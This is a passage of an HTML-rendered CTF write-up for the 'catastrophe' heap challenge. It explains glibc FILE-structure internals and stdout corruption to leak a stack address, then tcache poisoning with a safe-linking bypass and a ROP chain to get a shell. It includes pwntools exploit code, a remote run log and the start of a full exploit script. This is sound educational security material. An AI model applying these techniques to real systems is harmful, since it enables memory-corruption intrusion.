      <span class="o">||</span> <span class="p">((</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_LINE_BUF</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">ch</span> <span class="o">==</span> <span class="sc">&#39;\n&#39;</span><span class="p">))</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">_IO_do_write</span> <span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">,</span>
		      <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">-</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
      <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
  <span class="k">return</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="p">)</span> <span class="n">ch</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">libc_hidden_ver</span> <span class="p">(</span><span class="n">_IO_new_file_overflow</span><span class="p">,</span> <span class="n">_IO_file_overflow</span><span class="p">)</span>

</code></pre></div><p>Given <code>ch</code> is <code>\n</code>, to trigger the <code>_IO_do_flush</code> call which will flush the file stream we have to:</p>
<ul>
<li>Remove <code>_IO_NO_WRITES</code> from <code>fp-&gt;_flags</code> to avoid the first condition.</li>
<li>Add <code>_IO_CURRENTLY_PUTTING</code> to <code>fp-&gt;_flags</code> and give a non <code>NULL</code> value to <code>f-&gt;_IO_write_base</code> to avoid the second condition (useless code).</li>
<li>make <code>f-&gt;_IO_write_ptr</code> equal to <code>f-&gt;_IO_buf_end</code> to then call <code>_IO_do_flush</code>.</li>
</ul>
<p>Now we reached <code>_IO_do_flush</code> which is basically just a macro:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c">
<span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/libioP.h#L507
</span><span class="c1"></span><span class="cp">#define _IO_do_flush(_f) \
</span><span class="cp">  ((_f)-&gt;_mode &lt;= 0							      \
</span><span class="cp">   ? _IO_do_write(_f, (_f)-&gt;_IO_write_base,				      \
</span><span class="cp">		  (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)		      \
</span><span class="cp">   : _IO_wdo_write(_f, (_f)-&gt;_wide_data-&gt;_IO_write_base,		      \
</span><span class="cp">		   ((_f)-&gt;_wide_data-&gt;_IO_write_ptr			      \
</span><span class="cp">		    - (_f)-&gt;_wide_data-&gt;_IO_write_base)))
</span><span class="cp"></span>
</code></pre></div><p>Given <code>stdout</code> is byte-oriented <code>_IO_new_do_write</code> is called:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c">
<span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/fileops.c#L418
</span><span class="c1"></span><span class="k">static</span> <span class="n">size_t</span> <span class="nf">new_do_write</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">,</span> <span class="n">size_t</span><span class="p">);</span>

<span class="cm">/* Write TO_DO bytes from DATA to FP.
</span><span class="cm">   Then mark FP as having empty buffers. */</span>

<span class="kt">int</span>
<span class="nf">_IO_new_do_write</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">to_do</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">return</span> <span class="p">(</span><span class="n">to_do</span> <span class="o">==</span> <span class="mi">0</span>
	  <span class="o">||</span> <span class="p">(</span><span class="n">size_t</span><span class="p">)</span> <span class="n">new_do_write</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">to_do</span><span class="p">)</span> <span class="o">==</span> <span class="n">to_do</span><span class="p">)</span> <span class="o">?</span> <span class="mi">0</span> <span class="o">:</span> <span class="n">EOF</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">libc_hidden_ver</span> <span class="p">(</span><span class="n">_IO_new_do_write</span><span class="p">,</span> <span class="n">_IO_do_write</span><span class="p">)</span>

<span class="k">static</span> <span class="n">size_t</span>
<span class="n">new_do_write</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">to_do</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">size_t</span> <span class="n">count</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_IS_APPENDING</span><span class="p">)</span>
    <span class="cm">/* On a system without a proper O_APPEND implementation,
</span><span class="cm">       you would need to sys_seek(0, SEEK_END) here, but is
</span><span class="cm">       not needed nor desirable for Unix- or Posix-like systems.
</span><span class="cm">       Instead, just indicate that offset (before and after) is
</span><span class="cm">       unpredictable. */</span>
    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">=</span> <span class="n">_IO_pos_BAD</span><span class="p">;</span>
  <span class="k">else</span> <span class="nf">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">!=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="n">off64_t</span> <span class="n">new_pos</span>
	<span class="o">=</span> <span class="n">_IO_SYSSEEK</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">new_pos</span> <span class="o">==</span> <span class="n">_IO_pos_BAD</span><span class="p">)</span>
	    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">=</span> <span class="n">new_pos</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="n">count</span> <span class="o">=</span> <span class="n">_IO_SYSWRITE</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">to_do</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_cur_column</span> <span class="o">&amp;&amp;</span> <span class="n">count</span><span class="p">)</span>
    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_cur_column</span> <span class="o">=</span> <span class="n">_IO_adjust_column</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_cur_column</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">count</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
  <span class="n">_IO_setg</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">);</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_end</span> <span class="o">=</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&lt;=</span> <span class="mi">0</span>
		       <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">_IO_LINE_BUF</span> <span class="o">|</span> <span class="n">_IO_UNBUFFERED</span><span class="p">))</span>
		       <span class="o">?</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="nl">_IO_buf_base</span> <span class="p">:</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">count</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div><p>To avoid the <code>_IO_SYSSEEK</code> which could break stdout, we can add <code>_IO_IS_APPENDING</code> to <code>fp-&gt;_flags</code>. Then <code>_IO_SYSWRITE</code> is called and prints <code>(_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base</code> bytes from <code>(_f)-&gt;_IO_write_base</code> to stdout. But that&rsquo;s not finished, right after we got the stack leak <code>new_do_write</code> initializes the output / input buffer to <code>_IO_buf_base</code> except for the output buffer which is initialized to <code>_IO_buf_end</code> (<code>_IO_LINE_BUF</code> not present). Thus we have to make <code>fp-&gt;_IO_buf_base</code> and <code>fp-&gt;_IO_buf_end</code> equal to valid writable pointers.</p>
<p>Thus we just need to:</p>
<ul>
<li><code>fp-&gt;_flags</code> = (<code>fp-&gt;_flags</code> &amp; ~(<code>_IO_NO_WRITES</code>)) | <code>_IO_CURRENTLY_PUTTING</code> | <code>_IO_IS_APPENDING</code>.</li>
<li><code>f-&gt;_IO_write_ptr</code> = <code>fp-&gt;_IO_write_end</code> = <code>f-&gt;_IO_buf_end</code> = <code>&amp;environ + 8</code>.</li>
<li><code>fp-&gt;_IO_write_base</code> = <code>&amp;environ</code>.</li>
</ul>
<p>Which gives:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py">
<span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> 
    <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xfbad1800</span><span class="p">)</span> <span class="o">+</span> <span class="c1"># _flags</span>
    <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">environ</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="c1"># _IO_read_*</span>
    <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">environ</span><span class="p">)</span> <span class="o">+</span> <span class="c1"># _IO_write_base</span>
    <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">environ</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="c1"># _IO_write_ptr + _IO_write_end</span>
    <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">environ</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="c1"># _IO_buf_base</span>
    <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">environ</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="c1"># _IO_buf_end</span>
    <span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span> 

<span class="n">stack</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x130</span> <span class="o">-</span> <span class="mi">8</span> 
<span class="c1"># Offset of the saved rip that belongs to frame of the op_malloc function</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;stack: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

</code></pre></div><div class="gblog-post__anchorwrap">
    <h1 id="ropchain">
        ROPchain
        <a data-clipboard-text="https://nasm.re/posts/catastrophe/#ropchain" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor ROPchain" href="#ropchain">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<p>Now we leaked the stack address we finally just need to achieve another arbitrary write to craft the ROPchain onto the <code>op_malloc</code> function that writes the user input into the requested chunk.</p>
<p>To get the arbitrary write we just have to use the same overlapping chunks technique than last time, let&rsquo;s say we wanna write to <code>target</code> and we have <code>prev</code> that overlaps <code>victim</code>:</p>
<ul>
<li><code>free(prev)</code> ends up in the tcachebin (0x140), it has already been consolidated, it <em>already</em> overlaps <code>victim</code>.</li>
<li><code>free(victim)</code> ends up in the tcachebin (0x110).</li>
<li><code>malloc(0x130)</code> returns <code>prev</code>, thus we can corrupt <code>victim-&gt;next</code> and intialize it to <code>(target ^ ((chunk_location) &gt;&gt; 12)</code> to bypass safe-linking.</li>
<li><code>malloc(0x100)</code> returns <code>victim</code> and tcachebin (0x110) next free chunk is <code>target</code>.</li>
<li><code>malloc(0x100)</code> gives a write what where.</li>
</ul>
<p>When we got the write what where on the stack we simply have to craft a call ot system since there is no <code>seccomp</code> shit.
Here is the script:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># prev</span>
<span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1"># victim</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;T&#34;</span><span class="o">*</span><span class="mh">0x108</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x111</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">((</span><span class="n">stack</span> <span class="o">^</span> <span class="p">((</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0xb20</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">))),</span> <span class="mh">0x130</span><span class="p">)</span>
<span class="c1"># victim-&gt;next = target</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;TT&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span> <span class="o">+</span> <span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">(),</span> <span class="mh">0x100</span><span class="p">)</span> <span class="c1"># overwrite sRBP for nothing lmao</span>
<span class="c1"># ROPchain on do_malloc&#39;s stackframe</span>
</code></pre></div><p>And here we are:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nasm@off:~/Documents/pwn/diceCTF/catastrophe/f2$ python3 sexploit.py REMOTE <span class="nv">HOST</span><span class="o">=</span>mc.ax <span class="nv">PORT</span><span class="o">=</span><span class="m">31273</span>
<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/nasm/Documents/pwn/diceCTF/catastrophe/f2/catastrophe&#39;</span>
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
<span class="o">[</span>+<span class="o">]</span> Opening connection to mc.ax on port 31273: Done
/home/nasm/.local/lib/python3.10/site-packages/pwnlib/tubes/tube.py:822: BytesWarning: Text is not bytes<span class="p">;</span> assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  <span class="nv">res</span> <span class="o">=</span> self.recvuntil<span class="o">(</span>delim, <span class="nv">timeout</span><span class="o">=</span>timeout<span class="o">)</span>
<span class="o">[</span>*<span class="o">]</span> heap @ 0x559cb0184000
<span class="o">[</span>*<span class="o">]</span> libc: 0x7efe8a967000
<span class="o">[</span>*<span class="o">]</span> environ: 0x7efe8ab88200
<span class="o">[</span>*<span class="o">]</span> stdout: 0x7efe8ab81780
<span class="o">[</span>*<span class="o">]</span> stack: 0x7ffe06420710
<span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
$ id
<span class="nv">uid</span><span class="o">=</span><span class="m">1000</span> <span class="nv">gid</span><span class="o">=</span><span class="m">1000</span> <span class="nv">groups</span><span class="o">=</span><span class="m">1000</span>
$ ls
flag.txt
run
$ cat flag.txt
hope<span class="o">{</span>apparently_not_good_enough_33981d897c3b0f696e32d3c67ad4ed1e<span class="o">}</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h1 id="resources">
        Resources
        <a data-clipboard-text="https://nasm.re/posts/catastrophe/#resources" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Resources" href="#resources">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<ul>
<li><a
  class="gblog-markdown__link"
  href="https://a1ex.online/2020/10/01/glibc-IO%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"
  
  >a1ex.online</a
></li>
<li><a
  class="gblog-markdown__link"
  href="https://ray-cp.github.io/archivers/IO_FILE_arbitrary_read_write"
  
  >ray-cp</a
></li>
<li><a
  class="gblog-markdown__link"
  href="http://blog.leanote.com/post/mut3p1g/file-struct"
  
  >Mutepig&rsquo;s Blog</a
></li>
</ul>
<div class="gblog-post__anchorwrap">
    <h1 id="appendices">
        Appendices
        <a data-clipboard-text="https://nasm.re/posts/catastrophe/#appendices" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Appendices" href="#appendices">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<p>Final exploit:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>

<span class="c1"># this exploit was generated via</span>
<span class="c1"># 1) pwntools</span>
<span class="c1"># 2) ctfmate</span>

<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">pwn</span>


<span class="c1"># Set up pwntools for the correct architecture</span>
<span class="n">exe</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;catastrophe&#39;</span><span class="p">)</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="kc">True</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">rename_corefiles</span> <span class="o">=</span> <span class="kc">False</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">timeout</span> <span class="o">=</span> <span class="mi">2000</span>

<span class="n">host</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">HOST</span> <span class="ow">or</span> <span class="s1">&#39;127.0.0.1&#39;</span>
<span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">PORT</span> <span class="ow">or</span> <span class="mi">1337</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">local</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">remote</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">io</span>


<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">local</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span><span class="s1">b* main
</span><span class="s1">source ~/Downloads/pwndbg/gdbinit.py
</span><span class="s1">continue
</span><span class="s1">&#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>

<span class="n">io</span> <span class="o">=</span> <span class="kc">None</span>

<span class="n">libc</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;libc.so.6&#34;</span><span class="p">)</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">alloc</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">s</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
   <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;-</span><span class="se">\n</span><span class="s2">&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span> 
   <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Index?</span><span class="se">\n</span><span class="s2">&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span> 
   <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span> 
   
   <span class="k">if</span> <span class="n">s</span><span class="p">:</span>
       <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span> 
   <span class="k">else</span><span class="p">:</span>
       <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span> 

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
   <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;2&#34;</span><span class="p">)</span> 
   <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">view</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
   <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;3&#34;</span><span class="p">)</span> 
   <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
    <span class="n">alloc</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">view</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">heap</span> <span class="o">=</span> <span class="p">((</span><span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span><span class="p">))</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;heap @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="c1"># then we defeated safe linking lol</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;YY&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;YY&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;YY&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\0</span><span class="s2">&#34;</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
    <span class="n">free</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;YY&#34;</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span>

